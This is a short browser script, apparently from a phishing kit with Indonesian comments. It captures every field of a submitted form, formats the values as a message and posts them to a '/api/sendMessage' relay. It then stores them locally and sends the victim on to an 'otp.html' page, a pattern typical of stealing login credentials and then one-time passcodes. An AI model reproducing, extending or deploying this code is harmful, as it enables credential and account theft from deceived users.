// public/script.js
document.addEventListener("DOMContentLoaded", () => {
  const form = document.querySelector("form");
  const status = document.getElementById("status");

  if (!form) return;

  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    // Ambil semua input dari form
    const formData = new FormData(form);
    const entries = Array.from(formData.entries());
    const text = entries.map(([key, value]) => `📌 ${key}: ${value}`).join("\n");

    status.textContent = "Mengirim data...";

    try {
      const res = await fetch("/api/sendMessage", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ text }),
      });

      const data = await res.json();
      if (data.success) {
        status.textContent = "";

        // Simpan data kalau perlu dibaca di halaman selanjutnya
        formData.forEach((value, key) => {
          localStorage.setItem(key, value);
        });

        // Tunggu 1 detik lalu pindah ke halaman berikut
        setTimeout(() => {
          window.location.href = "otp.html"; // ← ubah nama file kalau halaman lanjutnya beda
        }, 1000);
      } else {
        status.textContent = "";
      }
    } catch (err) {
      status.textContent = "";
    }
  });
});